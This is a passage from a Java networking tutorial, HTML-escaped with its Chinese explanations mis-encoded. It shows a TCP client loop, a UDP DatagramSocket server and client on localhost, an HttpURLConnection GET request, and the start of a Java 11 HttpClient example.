&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">reader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;&amp;lt;&amp;lt; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bye&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„&lt;code>flush()&lt;/code>ï¼Œä¸ç„¶å¯èƒ½éƒ½æ”¶ä¸åˆ°æ¶ˆæ¯&lt;/p>
&lt;h3 id="socket---udp">Socket - UDP&lt;/h3>
&lt;p>Server&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DatagramSocket&lt;/span> &lt;span style="color:#111">ds&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramSocket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">6666&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// ç›‘å¬æŒ‡å®šç«¯å£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(;;)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// æ— é™å¾ªçŽ¯
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// æ•°æ®ç¼“å†²åŒº:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">1024&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">DatagramPacket&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramPacket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">receive&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// æ”¶å–ä¸€ä¸ªUDPæ•°æ®åŒ…
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// æ”¶å–åˆ°çš„æ•°æ®å­˜å‚¨åœ¨bufferä¸­ï¼Œç”±packet.getOffset(), packet.getLength()æŒ‡å®šèµ·å§‹ä½ç½®å’Œé•¿åº¦
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// å°†å…¶æŒ‰UTF-8ç¼–ç è½¬æ¢ä¸ºString:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getData&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOffset&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLength&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å‘é€æ•°æ®:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ACK&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setData&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æŽ¥æ”¶UDPæ•°æ®åŒ…ä¹‹å‰å…ˆè¦å‡†å¤‡ç¼“å†²åŒºï¼Œå¹¶é€šè¿‡&lt;code>DatagramPacket&lt;/code>å®žçŽ°æŽ¥æ”¶&lt;/p>
&lt;p>å‡è®¾æˆ‘ä»¬æ”¶å–åˆ°çš„æ˜¯ä¸€ä¸ª&lt;code>String&lt;/code>ï¼Œé‚£ä¹ˆï¼Œé€šè¿‡&lt;code>DatagramPacket&lt;/code>è¿”å›žçš„&lt;code>packet.getOffset()&lt;/code>å’Œ&lt;code>packet.getLength()&lt;/code>ç¡®å®šæ•°æ®åœ¨ç¼“å†²åŒºçš„èµ·æ­¢ä½ç½®&lt;/p>
&lt;p>å½“æœåŠ¡å™¨æ”¶åˆ°ä¸€ä¸ªDatagramPacketåŽï¼Œé€šå¸¸å¿…é¡»ç«‹åˆ»å›žå¤ä¸€ä¸ªæˆ–å¤šä¸ªUDPåŒ…ï¼Œå› ä¸ºå®¢æˆ·ç«¯åœ°å€åœ¨DatagramPacketä¸­ï¼Œæ¯æ¬¡æ”¶åˆ°çš„DatagramPacketå¯èƒ½æ˜¯ä¸åŒçš„å®¢æˆ·ç«¯ï¼Œå¦‚æžœä¸å›žå¤ï¼Œå®¢æˆ·ç«¯å°±æ”¶ä¸åˆ°ä»»ä½•UDPåŒ…&lt;/p>
&lt;p>Client&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DatagramSocket&lt;/span> &lt;span style="color:#111">ds&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramSocket&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSoTimeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1000&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InetAddress&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getByName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">6666&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è¿žæŽ¥æŒ‡å®šæœåŠ¡å™¨å’Œç«¯å£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å‘é€:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DatagramPacket&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramPacket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// æŽ¥æ”¶:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">1024&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramPacket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">receive&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getData&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOffset&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLength&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">disconnect&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™é‡Œçš„&lt;code>connect&lt;/code>ä¸æ˜¯çœŸè¿žæŽ¥ï¼Œå®ƒæ˜¯ä¸ºäº†åœ¨å®¢æˆ·ç«¯çš„&lt;code>DatagramSocket&lt;/code>å®žä¾‹ä¸­ä¿å­˜æœåŠ¡å™¨ç«¯çš„IPå’Œç«¯å£å·ï¼Œç¡®ä¿è¿™ä¸ª&lt;code>DatagramSocket&lt;/code>å®žä¾‹åªèƒ½å¾€æŒ‡å®šçš„åœ°å€å’Œç«¯å£å‘é€UDPåŒ…ï¼Œä¸èƒ½å¾€å…¶ä»–åœ°å€å’Œç«¯å£å‘é€ã€‚è¿™ä¹ˆåšä¸æ˜¯UDPçš„é™åˆ¶ï¼Œè€Œæ˜¯Javaå†…ç½®äº†å®‰å…¨æ£€æŸ¥ã€‚&lt;/p>
&lt;p>å¦‚æžœå®¢æˆ·ç«¯å¸Œæœ›å‘ä¸¤ä¸ªä¸åŒçš„æœåŠ¡å™¨å‘é€UDPåŒ…ï¼Œé‚£ä¹ˆå®ƒå¿…é¡»åˆ›å»ºä¸¤ä¸ª&lt;code>DatagramSocket&lt;/code>å®žä¾‹ã€‚&lt;/p>
&lt;p>åŽç»­çš„æ”¶å‘æ•°æ®å’ŒæœåŠ¡å™¨ç«¯æ˜¯ä¸€è‡´çš„ã€‚é€šå¸¸æ¥è¯´ï¼Œå®¢æˆ·ç«¯å¿…é¡»å…ˆå‘UDPåŒ…ï¼Œå› ä¸ºå®¢æˆ·ç«¯ä¸å‘UDPåŒ…ï¼ŒæœåŠ¡å™¨ç«¯å°±æ ¹æœ¬ä¸çŸ¥é“å®¢æˆ·ç«¯çš„åœ°å€å’Œç«¯å£å·ã€‚&lt;/p>
&lt;p>&lt;code>disconnect()&lt;/code>ä¹Ÿä¸æ˜¯çœŸæ­£åœ°æ–­å¼€è¿žæŽ¥ï¼Œå®ƒåªæ˜¯æ¸…é™¤äº†å®¢æˆ·ç«¯&lt;code>DatagramSocket&lt;/code>å®žä¾‹è®°å½•çš„è¿œç¨‹æœåŠ¡å™¨åœ°å€å’Œç«¯å£å·ï¼Œè¿™æ ·ï¼Œ&lt;code>DatagramSocket&lt;/code>å®žä¾‹å°±å¯ä»¥è¿žæŽ¥å¦ä¸€ä¸ªæœåŠ¡å™¨ç«¯ã€‚&lt;/p>
&lt;h3 id="httpclient">HttpClient&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.example.com/path/to/target?a=1&amp;amp;b=2&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HttpURLConnection&lt;/span> &lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HttpURLConnection&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">openConnection&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setRequestMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setUseCaches&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setConnectTimeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">5000&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è¯·æ±‚è¶…æ—¶5ç§’
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è®¾ç½®HTTPå¤´:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setRequestProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setRequestProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Mozilla/5.0 (compatible; MSIE 11; Windows NT 5.1)&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è¿žæŽ¥å¹¶å‘é€HTTPè¯·æ±‚:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// åˆ¤æ–­HTTPå“åº”æ˜¯å¦200:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getResponseCode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#111">200&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bad response&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// èŽ·å–æ‰€æœ‰å“åº”Header:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getHeaderFields&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">keySet&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// èŽ·å–å“åº”å†…å®¹:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»ŽJava 11å¼€å§‹ï¼Œå¼•å…¥äº†æ–°çš„&lt;code>HttpClient&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.URI&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.http.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.http.HttpClient.Version&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.time.Duration&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å…¨å±€HttpClient:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span> &lt;span style="color:#111">httpClient&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newBuilder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
